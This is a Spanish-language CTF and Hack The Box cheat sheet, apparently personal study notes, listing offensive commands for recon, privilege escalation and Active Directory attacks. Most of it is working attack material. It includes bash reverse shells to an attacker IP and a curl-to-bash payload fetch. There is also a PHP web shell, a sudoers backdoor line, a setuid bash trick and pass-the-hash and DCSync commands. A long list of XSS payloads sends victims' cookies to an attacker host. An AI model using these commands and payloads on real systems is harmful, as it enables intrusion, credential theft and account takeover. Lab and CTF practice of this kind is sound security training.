# CtfCheatsheet

### PUERTOS COMUNES
```
22:ssh
80/8080: http
443: https
139/445: smb
21: ftp
3306: mysql

```
### GIT
```
git log
git diff commit
git branch
git checkout dev --> en el branch te ha salido que habia un dev y estabas en public, asi lo cambias a dev

git/config --> fsmonitor = "chmod +s/4777/4755 /bin/bash" --> fsmonitor --> es un parametro usado para ejecutar comandos de sistema, esto lo metes en un archivo config y por ejemplo si lo ejecuta como root que lo sabes por el pspy te va a dar privilegios de root la proxima vez que se ejecute

```
### BASICS
```
CAT en windows es TYPE
WGET en windows es WGET nombredelarchivooriginal -OUTFILE nombrequequieras
En windows mirar carpetas ocultas no es -la es ls -force
La root.txt en windows se encuentra en /users/Administrator/Desktop
CURL es lo mismo que WGET ej: curl 10.10.14.4/linpeas.sh | bash , descarga y ejecuta linpeas a la vez
En evilwinrm para descargar un archivo directamente desde mi ordenador UPLOAD rutaarchivo/nombrearchivo
Siempre que ponga file= probar con ../../../../../../etc/passwd (LFI)
Si se junta LFI y PHP mira a ver si puedes hacer log poison
find / 2>/dev/null | grep \.txt$  ---> \. -> termina en txt,,  $ -> fin de linea, no hay nada detras del txt
FOOTHOLD --> todo lo que haces hasta llegar a una shell
```
### SUDOERS
```
echo "dev01    ALL=(ALL:ALL) ALL" >> /etc/sudoers   ---> cuando ejecutas algo como root puedes añadirle el usuario dev01 a la lista de sudoers y asi le das privilegios de root


```
### WINDOWS
```
cmdkey /list ---> te lista si hay contraseñas en texto claro guardadas
whoami /all
wmic logicaldisk get name
get-process
winpeas.exe
powerup.ps1 invoke-allchecks
dir \ /s/b | find ""
findstr /sp administrator *
```
### LINUX
```
sudo -l
linpeas
pspy64
find / -type f -newermt "2019-05-05" ! -newermt "2019-05-26" -ls 2>/dev/null
grep -R -i passwd,password,db_passwd,db_pass
export PATH=.:$PATH
```
### POWERVIEW
```
Import-Module .\PowerView.ps1 ----> Para activar el powerview si no el add-object/add-domain/get-domain no te funcionaran


```
### FREEBSD
```
Sockstat --> ver puertos abiertos si linpeas no te lo reconoce
```

### ABRIR SERVER PARA DESCARGAR COSAS
```
python3 -m http.server 80
python -m SimpleHTTPServer  80



```
### TUNNEL SSH/PORTFORWARDING
```
El tunel sirve para cuando te encuentras un puerto abierto que este en localhost (solo se puede acceder desde la propia maquina victima, solo esta abierto para dentro) que necesite de interfaz grafica como vncviewer
ssh -L 9999:127.0.0.1:5901 charix@10.10.10.84

ssh -L puertoquequeremosaccederdesdemimaquina:127.0.0.1:puertodelservicio usuario@IP

```
### CHISEL
```
./chisel server -p 9999 --reverse ---> nuestra maquina, primero este comando
./chisel client 10.10.14.4:9999 R:3000:172.17.0.1:3000 ---> maquina victima
./chisel client 10.10.14.4:9999 R:127.0.0.1:7777:172.17.0.1:3000 ---> localhost:7777
```
### SQLMAP
```
python3 sqlmap.py --batch --risk 3 --level 5 --technique=BEUSQ --privilege -r ./reqs/tri.req ---> busca posibles inyecciones sql

sqlmap -r genres.request --second-req feed.request --batch --tamper=space2comment --technique=U --level 5 --> doble inyeccion sql

```
### SSTI
```
${{<%[%'"}}%\ probar estos caracteres si da error puede ser suscetible de ssti
Si sabes que framework utiliza la web buscas el nombre del framework ssti si no lo sabes pruebas con la imagen del identify ---> https://portswigger.net/research/server-side-template-injection


```
### SMB TRASNFER FILES
```

sudo impacket-smbserver share ./ -> Te transfiere los archivos del directorio en el que te encuentres
```
### LDAP
```
ldapsearch -x -H ldap://10.10.10.169  -D '' -w '' -b "DC=megabank,DC=local" --> te busca todo lo que hay en el directorio activo si no te pide usuario y contraseña
ldapsearch -x -H ldap://10.10.10.169 -D '' -w '' -b "DC=megabank,DC=local" -s sub "(objectclass=user)" | grep description,info --> busca mas especificamente la clase user que tenga ''descripcion o info'' (solo 1 por vez)

ldapsearch -x -H ldap://10.10.10.169 -D '' -w '' -b "DC=megabank,DC=local"  | grep sAMAccountName: --> te saca solo lista de usuarios

```
### ENUMERAR USUARIOS/PASSWD WINDOWS
```
impacket-GetNPUsers.py active.htb/ -dc-ip 10.10.10.100 -request ---> kerberoasting, tienes una lista de usuarios y sacas la contraseña
crackmapexec smb 10.10.10.161 --users  --> saca usuarios de esa ip
crackmapexec smb 10.10.10.169 -u ./users -p password --no-bruteforce ---> te comprueba una lista de usuarios contra una lista de passwd
crackmapexec smb 10.10.10.169 -u ./users -p Welcome123! --no-bruteforce ---> te comprueba una lista de usuarios contra un passwd en concreto
```
### IMPACKET
```
impacket-psexec administrator@10.129.95.187 ---> te logea con administrador, te pide la pass luego
impacket-psexec  administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 ---> te logea cuando tienes un hash
sudo impacket-smbserver share ./ ---> Te transfiere los archivos del directorio en el que te encuentres
impacket-GetNPUsers.py active.htb/ -dc-ip 10.10.10.100 -request ---> kerberoasting, tienes una lista de usuarios y sacas la contraseña

impacket-secretsdump htb/svc-alfresco@10.10.10.161 ---> te saca los hashes NTLM de todos los usuarios del dominio

```
### NMAP
```
nmap *10.129.196.97 -p 1-65535 -T4 -A -v   //// -T4(limite de tiempo) -A ( agresivo inclue -sV ( versiones) -sC (scripts) -O (-o sistema operativo)) -v (muestre mas cosas en consolas)

nmap -sS -sU -T4 -A -v 10.10.10.3 (puertos udp)

```
### REVERSE SHELL
```

!/bin/bash ---> otra shell por ejemplo cuando estamos dentro de un programa que utiliza less( igual que el vim/nano
solo que no se puede escribir) ejecutamos !/bin/bash y nos saca fuera como si fueramos root
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
cuando no funciona un comando se prueba poniendo bash -c "comando" en este caso ->> bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"

"chmod +s/4777/4755 /bin/bash" --> chmod +s/... -> le cambia el indicador de usuario y grupo (GID, UID) a root de /bin/bash
bash -p se usa cuando has añadido chmod +s/4777/4755 para ignorar el GID y UID que tiene por defecto y ejecuta el del propio archivo, habiendolo cambiando antes con chmod +s a root, lo ejecuta como root y te da privilegios de root

REVERSE SHELL MAS POTENTE (Se ejecuta una vez que están dentro de una reverse Shell) ->

python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")

Se puede copiar la reverse shell (bash -i >& /dev/tcp/10.0.0.1/8080 0>&1) en un .sh por ejemplo el shell.sh y a traves de python3 -m http.server 80 lo subimos a la maquina victima y lo ejecutamos en caso de que no te funcione la reverse de primeras, en la maquina victima --> wget 10.10.14.6/shell.sh --> bash shell.sh
Tambien se puede ejecutar directamente con curl en la victima usando el buscador web sabiendo que es php y teniendo una shell.php, teniendo el servidor http.server 80 corriendo en nuestra maquina y con una shell dentro de la victima (shell.php) podemos hacer http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:80/shell.sh|bash
```
### MYSQL
```
mysql -h IP -u root
Dentro de la revershell lanzamos mysql -u user -pPASSWD (sin espacio detras de la p)
show databases;
por ejemplo tenemos la databases de joomla ---> use joomla
show tables;
select * FROM users \G (por ejemplo la que encontramos es user)

```
### FTP
```
ftp <IP>
>anonymous
>anonymous
>ls -a # List all files (even hidden) (yes, they could be hidden)
>binary #Set transmission to binary instead of ascii
>ascii #Set transmission to ascii instead of binary
>bye #exit
wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all
Tambien se puede descargar desde dentro de ftp con get filename
```
### FFUF
```
		-MC --> acepta cualquier codigo
		-fs 0 ----> filtra tamaño 0
		-status 404 --> no hay nada
		-status 200 ---> buscamos este
		-status 301 ---> comun como el 404

ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.sh,.txt,.aspx -u http://10.10.11.175:8530/FUZZ -mc all -ic  ---->> lista directorios que hay en la pagina
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -fs
ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -u http://10.10.10.70:8080/submit -d "character=bart&quote=FUZZ" -H Content-Type:application/x-www-form-urlencoded -mc all  ---> probar caracteres especiales para inyeccion SSTI
ffuf -w /usr/share/seclists\Usernames\xato-net-10-million-usernames.txt -u http://10.10.11.160:5000/login -d "username=FUZZ&password=nidecoña" -H Content-Type:application/x-www-form-urlencoded -mr 'Invalid login'
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://10.10.11.164/uploads/FUZZ  ---> PRUEBA TODOS LOS LFI POSIBLES PARA LA PAGINA 10.10.11.164/UPLOADS
  -mc para filtrar que solo salga lo que quieras de status 'c'
  -fs es para excluir sites que se repitan
```
### BRUTE FORCE
```
``
##JOHN THE RIPPER
 ``

.\john.exe .\hashes.txt --mask=susan_nasus_?d?d?d?d?d?d?d?d?d --format=Raw-SHA256  --> --mask= si sabes algo en concreto de la password, en este caso sabes que empieza por susan_nasus y va del 1 al 1.000.000.000 de hay que sea ?d?d?d?d?d?d?d?d?d --format= añades el formato del hash esto lo buscas en -> https://hashcat.net/wiki/doku.php?id=example_hashes

--mask -> son 9 numeros por lo tanto es d y una ? delante por cada d
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff
 ``
 ## HASHCAT
 ``

hashcat -a 3 -m 18200  abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f "susan_nasus_?d?d?d?d?d?d?d?d?d"
-m 1400 = porque el hash es tipo Raw-SHA256, sacas que es 1400 de aqui https://hashcat.net/wiki/doku.php?id=example_hashes

-a 3 = siempre a menos que quieras meter una rule que seria= -a 0

hashcat -a 3 -m 18200 hashes.txt rockyou.txt

```
### DC-SYNC
```
impacket-secretsdump -just-dc melanie:Welcome123@10.10.10.169  -outputfile dcsync_hashes ---> teniendo un usuario y contraseña validos te saca todos los demas
```
### SSH-SCP
```
 ``
 ##SSH
 ``
conectar por SSH ---> ssh user@IP ---> te pide la pass luego
ssh-keygen -f "user"  ---> crea tu key(llave) ssh-keygen -f "peterolord"
echo "public key" > /home/susan/.ssh/authorized_keys  ---> mete tu keyn en el fichero del servidor authorizedkey para poder utilizarlo 
ssh chmod 600 key para darle permisos y que funcione
ssh -i  peterolord(nombre llave) susan@10.10.11.253   ---> conecta tu maquina con el servidor mediante ssh, si tuvieras la contraseña de susan seria ->>
ssh -i susan susan@10.10.11.253 --> teniendo la key de susan 
	nombrekey  user@IPMaquina	
 ``
 ##SCP
 ``
subir ficheros --> scp -i peterolord ./Downloads/linpeas.sh  susan@10.10.11.253:/tmp  --> (peterolord=mi key) /user@IP/direccion donde quieres subir el archivo 
bajar ficheros --> scp -i peterolord susan@10.11.253.10:/rutadelficheroadescargar ./rutadondequieresdescargarlo	
TENIENDO CONTRASEÑA ---> no se pone -i peterolord --->scp ./Downloads/linpeas.sh  susan@10.10.11.253:/tmp
Una vez que ya tienes el linpeas dentro de la maquina victima te vas a /tmp y haces BASH linpeash.sh
Si es winpeas lo corres poniendo el nombre solo

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGcUHHKDpEXK5XbpXBFIoJ6Duq+2c1Y9gfoLn+BK+RhR = ''USER'' KEY
```
### PHP SHELL
```
<?php system($_REQUEST['cmd']); ?>
Si es un .php con html solo pones : <?php echo "Shell":system($_REQUEST['cmd']); ?>  ---> te saldra por algun lado ''Shell'' para que sepas que ha funcionado
Si tiene un <?php al principio pones solo: echo "Shell":system($_REQUEST['cmd']);
$_REQUEST --> admite tanto POST como GET
Si viene escrito shell en algun lado es que ha funcionado.

Al ver que funciona ya metes la shell de PHP ( ver PHP SHELL)
Si por ejemplo has introducido el codigo php en una pagina que se llama index.php, buscas ---> dev.devvortex.htb/index.php?cmd=id
te lo llevas al burpsuite y ya hay desde el repeater vas buscando con ls, etc

```
### IMPACKET
```

impacket-GetNPUsers.py active.htb/ -dc-ip 10.10.10.100 -request ---> kerberoasting, tienes una lista de usuarios y sacas la contraseña

```
### BLOODHOUND
```

1) activas el neo4j -> 
 - cd /usr/bin
 -./neo4j console
2) desde donde tienes el bloodhound en este caso Downloads/Bloodhound tiras -> ./BloodHound --no-sandbox
3) te abrira el bloodhound, acc: neo4j y pass: rvb07996

bloodhound-python -d jab.htb -c all -u svc_openfire -p '!@#$%^&*(1qazxsw' -ns 10.10.11.4 --zip ---> te devuelve un archivo zip que lueg
lo metes en el bloodhound, lo analiza y te dice que pasos seguir para escalar privilegios

SI NO TE ABRE LOS JSON/ZIP QUE HAS OBTENIDO DEL BLOODHOUND PROBAR CON RUSTHOUND!!!!

```
### RUSTHOUND
```
/home/kali/.cargo/bin/rusthound --domain htb.local ---> si el los json/zip del bloodhound no te abren probar a descargarlos de aqui e importarlos

```
### 139/445 ---> SMB (COMPARTIR CARPETA)
```

	crackmapexec smb 10.129.71.181 -u '' -p '' --shares (shares = cualquier carpeta) 
	lista carpetas que hay compartidas con login null
	crackmapexec smb 10.129.71.181 -u 'anonymous' -p '' --shares
	loggin con usuario
	smbclient --no-pass //IP/Folder   (se conecta a la carpeta)
	smbclient -L -> lista carpetas compartidas
```
### EVIL-WINRM 
```

evil-winrm -i 10.129.136.91 -u administrator -p badminton

```
### NTLM
```

NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response
authentication protocol used to authenticate a client to a resource on an Active Directory domain.
It is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor
only once, at login.
The NTLM authentication process is done in the following way :
1. The client sends the user name and domain name to the server.
2. The server generates a random character string, referred to as the challenge.
3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the
server.
4. The server retrieves the user password (or equivalent).
5. The server uses the hash value retrieved from the security account database to encrypt the challenge
string. The value is then compared to the value received from the client. If the values match, the client
is authenticated.

```
### LFI ---> Local File Inclusion
``` 

Por ejemplo en la maquina responder htb tenemos la pagina http://unika.htb/index.php?page=french.html que puede ser vulnerable a LFI
si no esta bien configurada
En un sistema windows vamos a probar si funciona e incluye files en el sistema con la ruta de /system32 que siempre existe
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
Una vez que sabemos que es vulnerable siendo windows podemos seleccionar un protocolo como SMB, windows intentara autenticarse
en nuestra maquina y nosotros capturaremos el NetNTLMv2 (New Technology Lan Manager) con la herramienta RESPONDER
```
### RESPONDER ---> (capturar NTLM entre otros)
```

Lo inicializamos --> sudo responder -I {network_interface} se ve con ifconfig
Ahora le decimos al server que incluya un recurso de nuestro SMB server con -Z http://unika.htb/?page=//10.10.14.25/somefile
con la ip de nuestra maquina atacante ( dara un error en la web pero en el responder tendremos  NetNTLMv del administrator)
```
### XSS
```

Robar cookies de admin ---> probar en el burpsuite con un payload con estos script, suele funcionar el siguiente ->>
<script>var i=new Image();i.src="http://10.10.14.3/?c="+document.cookie</script>

PREVIAMENTE: -> Se abre un servidor http por el puerto 80 por el que se recibirá la cookie del administrador, con esta cookie la cambiamos 
o bien dentro del burp suite o bien en el navegador -> (navegador) -> click derecho en el buscador, seleccionamos inspect element -> storage tab -> modificamos la cookie que hemos robado

<img src=x onerror=this.src="http://10.10.14.3/?c="+document.cookie>
<img src=x onerror="location.href='http://10.10.14.3/?c='+ document.cookie">
<script>new Image().src="http://10.10.14.3/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://10.10.14.3/?c="+escape(document.cookie);</script>
<script>location.href = 'http://10.10.14.3/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://10.10.14.3/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://10.10.14.3/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://10.10.14.3/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://10.10.14.3/?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://10.10.14.3/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://10.10.14.3/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://10.10.14.3/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://10.10.14.3/?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://10.10.14.3/?c="+document.cookie</script>
<script>window.location="https://10.10.14.3/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://10.10.14.3/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://your-subdomain-here.burpcollaborator.net/', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>

```
### ZONE TRASNFER(tcp 53)
```
 Linux ->
dig axfr @"ip" dns
Windows -> 
nslookup
  server "ip"
  ls -d ctfolympus.htb


```
### ENLACES DE INTERES
```

https://app.hackthebox.com/home
https://www.exploit-db.com/ ----> buscar vulnerabilidades conocidas de por ejemplo servidores de paginas web de cualquier año
https://book.hacktricks.xyz/welcome/readme  ----> de todo 
https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg ----> active directory    
https://gchq.github.io/CyberChef/ ---> encripta/desencripta cualquier formato
https://gtfobins.github.io/  ---> escalar privilegios windows/linux por ejemplo consigues permisos de usuario y tienes el programa 7Z pues te dice como escalar a usuario root mediante sudo
https://ippsec.rocks/  ----> youtuber: ippsec tiene todas las maquinas resueltas de hackthebox y buscas por termino y te lleva al video resolviendo la maquina en el minuto concreto por ejemplo buscas ''nmap -sC''
https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/silver-ticket    ----> como hacktricks
https://attack.mitre.org/  ---->  tecnicas, muy pesado
https://jdk.java.net/java-se-ri/7  ----> descargar todas las versiones java
https://www.thehacker.recipes/ad/persistence/sid-history  ---> como hacktricks
https://jwt.io ---> lee cookies
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#blind-xss ---> XSS SCRIPT
https://github.com/Lopsy84/CtfCheatsheet  ----> apuntes alvaro
https://lolbas-project.github.io/  ---> programas que puedes usar para escalar privilegios WINDOWS

